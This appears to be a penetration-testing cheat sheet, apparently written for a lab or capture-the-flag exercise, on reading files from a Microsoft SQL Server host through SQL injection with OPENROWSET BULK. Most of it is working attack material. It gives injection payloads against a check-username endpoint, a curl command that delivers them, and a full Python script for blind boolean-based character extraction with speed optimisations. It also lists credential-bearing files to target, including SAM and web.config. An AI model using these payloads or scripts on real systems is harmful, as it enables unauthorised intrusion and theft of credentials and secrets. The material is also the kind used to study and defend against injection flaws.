# 📂 MSSQL File Read

## Overview

With correct permissions, we can read files via SQL injection using the `OPENROWSET` function with bulk operations.

---

## OPENROWSET Syntax

### Get File Length

```sql
SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x
```

### Get File Contents

```sql
SELECT BulkColumn FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x
```

### Data Types

| Option | Storage Type | Use Case |
|--------|--------------|----------|
| `SINGLE_CLOB` | varchar | Text files |
| `SINGLE_BLOB` | varbinary | Binary files |
| `SINGLE_NCLOB` | nvarchar | Unicode text |

---

## Required Permissions

Bulk operations require one of:
- `ADMINISTER BULK OPERATIONS`
- `ADMINISTER DATABASE BULK OPERATIONS`

### Check Permissions Query

```sql
SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') 
WHERE permission_name = 'ADMINISTER BULK OPERATIONS' 
   OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';
```

### SQLi Payload

```sql
maria' AND (SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') 
WHERE permission_name = 'ADMINISTER BULK OPERATIONS' 
   OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS')>0;--
```

### URL Encode & Test

```bash
# Encode
printf %s "maria' AND (SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS') > 0;--" | jq -rR @uri

# Send
curl -s "http://<TARGET>/api/check-username.php?u=<ENCODED_PAYLOAD>"
```

**Response**: `taken` = Permissions granted ✅

---

## Boolean-based File Read

### Attack Strategy

1. Find file length using `LEN()`
2. Extract each character using `SUBSTRING()` + `ASCII()`
3. Use bisection for efficiency

### Python Script

```python
#!/usr/bin/env python3
import requests
import json
import sys
from urllib.parse import quote_plus

target = "maria"

def oracle(query):
    payload = quote_plus(f"{target}' AND ({query})-- -")
    response = requests.get(f"http://<TARGET>/api/check-username.php?u={payload}")
    jsonResponse = json.loads(response.text)
    return jsonResponse['status'] == 'taken'

# Target file
filePath = r'C:\Windows\System32\flag.txt'

# Step 1: Get file length
length = 1
while not oracle(f"(SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '{filePath}', SINGLE_CLOB) AS x) = {length}"):
    length += 1

print(f"[*] File length = {length}")

# Step 2: Extract contents using bisection
print("[*] File = ", end='')

for i in range(1, length + 1):
    low = 0
    high = 127
    
    while low <= high:
        mid = (low + high) // 2
        query = f"(SELECT ASCII(SUBSTRING(BulkColumn, {i}, 1)) FROM OPENROWSET(BULK '{filePath}', SINGLE_CLOB) AS x) BETWEEN {low} AND {mid}"
        
        if oracle(query):
            high = mid - 1
        else:
            low = mid + 1
    
    print(chr(low), end='')
    sys.stdout.flush()

print()
```

### Output

```bash
$ python3 fileRead.py
[*] File length = 37
[*] File = [FILE_CONTENTS]
```

---

## Query Templates

### Check File Length

```sql
(SELECT LEN(BulkColumn) FROM OPENROWSET(BULK 'C:\path\file.txt', SINGLE_CLOB) AS x) = N
```

### Extract Character at Position

```sql
(SELECT ASCII(SUBSTRING(BulkColumn, N, 1)) FROM OPENROWSET(BULK 'C:\path\file.txt', SINGLE_CLOB) AS x) = ASCII_VALUE
```

### Bisection Query

```sql
(SELECT ASCII(SUBSTRING(BulkColumn, N, 1)) FROM OPENROWSET(BULK 'C:\path\file.txt', SINGLE_CLOB) AS x) BETWEEN low AND mid
```

---

## Common Files to Read

### Windows

| File | Path |
|------|------|
| Hosts | `C:\Windows\System32\drivers\etc\hosts` |
| SAM (requires SYSTEM) | `C:\Windows\System32\config\SAM` |
| Web config | `C:\inetpub\wwwroot\web.config` |
| IIS logs | `C:\inetpub\logs\LogFiles\` |

### Application-specific

| File | Purpose |
|------|---------|
| `web.config` | Connection strings, secrets |
| `appsettings.json` | .NET Core config |
| `connectionStrings.config` | Database credentials |

---

## Limitations

- Requires bulk operation permissions
- File must be accessible to SQL Server service account
- Large files take long time (character-by-character)
- Binary files need `SINGLE_BLOB` and hex encoding

---

## Optimization Tips

### Use SQL-Anding for Speed

```python
def extract_char(position):
    c = 0
    for p in range(7):
        query = f"(SELECT ASCII(SUBSTRING(BulkColumn, {position}, 1)) FROM OPENROWSET(BULK '{filePath}', SINGLE_CLOB) AS x) & {2**p} > 0"
        if oracle(query):
            c |= 2**p
    return chr(c)
```

### Parallel Extraction

Extract multiple characters simultaneously using threading.

---

## Error Handling

### File Not Found

If file doesn't exist, query will error. Test with known file first.

### Permission Denied

Service account may not have read access to file.

### Timeout

Large files may cause query timeout. Adjust script accordingly.

---

## Quick Reference

### Permission Check

```sql
SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') 
WHERE permission_name LIKE '%BULK%';
```

### Read File

```sql
SELECT BulkColumn FROM OPENROWSET(BULK 'path', SINGLE_CLOB) AS x
```

### File Length

```sql
SELECT LEN(BulkColumn) FROM OPENROWSET(BULK 'path', SINGLE_CLOB) AS x
```

